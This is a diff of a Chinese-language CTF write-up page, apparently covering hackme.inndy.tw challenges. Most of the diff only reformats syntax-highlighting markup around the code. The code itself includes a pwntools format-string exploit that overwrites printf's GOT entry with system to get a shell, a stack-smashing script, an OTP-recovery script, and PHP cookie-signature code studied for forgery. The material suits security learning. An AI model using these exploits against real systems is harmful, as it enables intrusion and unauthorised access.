+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;main_addr: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">main_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc_addr: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 得到 libc 基址</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">,</span> <span class="n">libc_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc_base: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 得到 elf 基址</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf_offset</span> <span class="o">=</span> <span class="n">main_addr</span> <span class="o">-</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 得到 printf_got 地址</span>
+</span></span><span class="line"><span class="cl"><span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf_offset</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;printf_got: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">printf_got</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 得到 system 地址</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;system_addr: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 64位没法使用 fmtstr_payload, 因为默认把地址放在前面会导致大概率被 \x00 截断</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fmt_str_payload64</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    生成 64 位格式化字符串payload
+</span></span></span><span class="line"><span class="cl"><span class="s2">    offset: 偏移
+</span></span></span><span class="line"><span class="cl"><span class="s2">    src: 源地址
+</span></span></span><span class="line"><span class="cl"><span class="s2">    data: 欲写入内容
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload1</span><span class="p">,</span> <span class="n">payload2</span> <span class="o">=</span> <span class="p">[],</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="p">[[</span><span class="nb">ord</span><span class="p">(</span><span class="n">v</span><span class="p">),</span> <span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">data</span><span class="p">)[:</span><span class="o">-</span><span class="mi">2</span><span class="p">])]</span> <span class="c1"># 最后两位一般是 \x00</span>
+</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">chr_cnt</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">index</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload1</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;%</span><span class="si">{:02}</span><span class="s1">c%</span><span class="si">{}</span><span class="s1">$hhn&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-</span><span class="n">chr_cnt</span><span class="p">,</span> <span class="n">offset</span><span class="o">+</span><span class="mi">9</span><span class="o">+</span><span class="n">index</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload2</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">value</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chr_cnt</span> <span class="o">=</span> <span class="n">value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 用 &#39;_&#39; 对齐</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">flat</span><span class="p">(</span><span class="n">payload1</span> <span class="o">+</span> <span class="p">[</span><span class="s1">&#39;_&#39;</span> <span class="o">*</span> <span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="n">payload2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmt_str_payload64</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">printf_got</span><span class="p">,</span> <span class="n">system_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这个地方有个坑点就是 240 这个数, 和 libc 的版本相关&hellip;
 问了 M4x 师傅才知道, 我果然还是太 naive 了</p>
@@ -1225,8 +1225,8 @@ Tips: ASLR enabled</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nc hackme.inndy.tw <span class="m">7720</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc hackme.inndy.tw <span class="m">7720</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></blockquote>
 <div class="highlight"><div class="chroma">
@@ -1240,14 +1240,14 @@ Tips: ASLR enabled</p>
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">➤ checksec echo3
-[*] &#39;/home/aloxaf/CTF/echo3&#39;
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x8048000)
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">➤ checksec echo3
+</span></span><span class="line"><span class="cl">[*] &#39;/home/aloxaf/CTF/echo3&#39;
+</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE (0x8048000)
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这道题的难点主要是缓冲区不在栈上, 而是在堆上.</p>
 <p>这极大地限制了任意地址读写的能力, 基本上只能靠<code>%$n</code>来读写当前栈里的数据.</p>
@@ -1265,10 +1265,10 @@ Tips: ASLR enabled</p>
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;Try to read the flag</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mh">0x15u</span><span class="p">);</span>
-  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x10000u</span><span class="p">);</span>
-  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">size_t</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">);</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;Try to read the flag</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mh">0x15u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x10000u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">size_t</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>于是又跑去看 M4x 师傅的博客, 看到了这篇文章:  <a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/">论canary的几种玩法</a></p>
 <p>非常硬却失挺的方法, 学习了</p>
@@ -1291,22 +1291,22 @@ Tips: ASLR enabled</p>
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="n">gdb</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;konsole&#39;</span><span class="p">,</span> <span class="s1">&#39;-e&#39;</span><span class="p">]</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;DEBUG&#39;</span>
-
-<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;hackme.inndy.tw&#39;</span><span class="p">,</span> <span class="mi">7717</span><span class="p">)</span>
-<span class="c1"># io = process(&#39;./smash-the-stack&#39;)</span>
-<span class="n">ex</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./smash-the-stack&#39;</span><span class="p">)</span>
-<span class="n">buff_addr</span> <span class="o">=</span> <span class="n">ex</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;buff&#39;</span><span class="p">]</span>
-
-<span class="c1"># gdb.attach(io)</span>
-<span class="c1"># raw_input()</span>
-<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">buff_addr</span><span class="p">)</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;konsole&#39;</span><span class="p">,</span> <span class="s1">&#39;-e&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;DEBUG&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;hackme.inndy.tw&#39;</span><span class="p">,</span> <span class="mi">7717</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#39;./smash-the-stack&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ex</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./smash-the-stack&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">buff_addr</span> <span class="o">=</span> <span class="n">ex</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;buff&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(io)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># raw_input()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">buff_addr</span><span class="p">)</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h1 id="crypto">Crypto</h1>
 <h2 id="easy">easy</h2>
@@ -1373,25 +1373,25 @@ Tips: What is symmetric cipher?</p>
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Crypto.Util</span> <span class="kn">import</span> <span class="n">number</span>
-<span class="kn">import</span> <span class="nn">requests</span>
-
-<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://hackme.inndy.tw/otp/?issue_otp=illya&#39;</span>
-
-<span class="n">ciphers</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
-    <span class="n">ciphers</span> <span class="o">+=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
-
-<span class="n">b</span> <span class="o">=</span> <span class="p">[</span><span class="n">number</span><span class="o">.</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ciphers</span><span class="o">.</span><span class="n">split</span><span class="p">()]</span>
-
-<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="mi">0</span><span class="p">])):</span>
-    <span class="n">c</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span> <span class="o">-</span> <span class="nb">set</span><span class="p">([</span><span class="n">i</span><span class="p">[</span><span class="n">_</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">b</span><span class="p">])</span>
-    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">pop</span><span class="p">()),</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
-        <span class="nb">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util</span> <span class="kn">import</span> <span class="n">number</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://hackme.inndy.tw/otp/?issue_otp=illya&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ciphers</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ciphers</span> <span class="o">+=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="p">[</span><span class="n">number</span><span class="o">.</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ciphers</span><span class="o">.</span><span class="n">split</span><span class="p">()]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="mi">0</span><span class="p">])):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span> <span class="o">-</span> <span class="nb">set</span><span class="p">([</span><span class="n">i</span><span class="p">[</span><span class="n">_</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">b</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">pop</span><span class="p">()),</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>然而很迷的是跑出来的 FLAG 不完整&hellip;好在能够猜出来</p>
 <h2 id="shuffle">shuffle</h2>
@@ -1412,8 +1412,8 @@ Tips: What is symmetric cipher?</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">if</span><span class="p">(</span><span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">])</span> <span class="nx">printf</span><span class="p">(</span><span class="s2">&#34;&lt;code&gt;%s&lt;/code&gt;&#34;</span><span class="p">,</span> <span class="nx">htmlentities</span><span class="p">(</span><span class="nv">$flag</span><span class="p">));</span> <span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">if</span><span class="p">(</span><span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">])</span> <span class="nx">printf</span><span class="p">(</span><span class="s2">&#34;&lt;code&gt;%s&lt;/code&gt;&#34;</span><span class="p">,</span> <span class="nx">htmlentities</span><span class="p">(</span><span class="nv">$flag</span><span class="p">));</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>分析设置 cookie 的代码, 得知 cookie 内容为 <code>$sig#$serialized</code>, 以 guest 为例, 内容为 <code>6bcb9c9155975a53e951b0b50f137480#name=guest&amp;admin=0 </code></p>
 <p>只要能够修改 admin 为非 0 值, 就能得到 flag.</p>
@@ -1435,21 +1435,21 @@ Tips: What is symmetric cipher?</p>
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">set_user</span><span class="p">(</span><span class="nv">$user_data</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="k">global</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$secret</span><span class="p">;</span>
-
-    <span class="nv">$user</span> <span class="o">=</span> <span class="p">[</span>
-        <span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="nv">$user_data</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span>
-        <span class="s1">&#39;admin&#39;</span> <span class="o">=&gt;</span> <span class="nv">$user_data</span><span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">]</span>
-    <span class="p">];</span>
-
-    <span class="nv">$serialized</span> <span class="o">=</span> <span class="nx">http_build_query</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
-    <span class="nv">$sig</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$secret</span><span class="p">)</span><span class="o">.</span><span class="nv">$serialized</span><span class="p">);</span>
-    <span class="nv">$all</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">{</span><span class="nv">$sig</span><span class="si">}</span><span class="s2">#</span><span class="si">{</span><span class="nv">$serialized</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">);</span>
-    <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">,</span> <span class="nv">$all</span><span class="p">,</span> <span class="nx">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">set_user</span><span class="p">(</span><span class="nv">$user_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$secret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="nv">$user_data</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;admin&#39;</span> <span class="o">=&gt;</span> <span class="nv">$user_data</span><span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$serialized</span> <span class="o">=</span> <span class="nx">http_build_query</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$sig</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$secret</span><span class="p">)</span><span class="o">.</span><span class="nv">$serialized</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$all</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">{</span><span class="nv">$sig</span><span class="si">}</span><span class="s2">#</span><span class="si">{</span><span class="nv">$serialized</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">,</span> <span class="nv">$all</span><span class="p">,</span> <span class="nx">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>然而 cookie 有验证过程, cookie 通过验证的条件是: <code>md5(md5($secret).$serialized) == $sig</code>, 如果知道 <code>$secret</code> 的值的话, 就很简单了, 然而并不知道&hellip;</p>
 <div class="highlight"><div class="chroma">
@@ -1474,25 +1474,25 @@ Tips: What is symmetric cipher?</p>
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">load_user</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="k">global</span> <span class="nv">$secret</span><span class="p">,</span> <span class="nv">$error</span><span class="p">;</span>
-
-    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]))</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">list</span><span class="p">(</span><span class="nv">$sig</span><span class="p">,</span> <span class="nv">$serialized</span><span class="p">)</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;#&#39;</span><span class="p">,</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]),</span> <span class="mi">2</span><span class="p">);</span>
-
-    <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$secret</span><span class="p">)</span><span class="o">.</span><span class="nv">$serialized</span><span class="p">)</span> <span class="o">!==</span> <span class="nv">$sig</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nv">$error</span> <span class="o">=</span> <span class="s1">&#39;Invalid session&#39;</span><span class="p">;</span>
-        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="nx">parse_str</span><span class="p">(</span><span class="nv">$serialized</span><span class="p">,</span> <span class="nv">$user</span><span class="p">);</span>
-    <span class="k">return</span> <span class="nv">$user</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">load_user</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$secret</span><span class="p">,</span> <span class="nv">$error</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
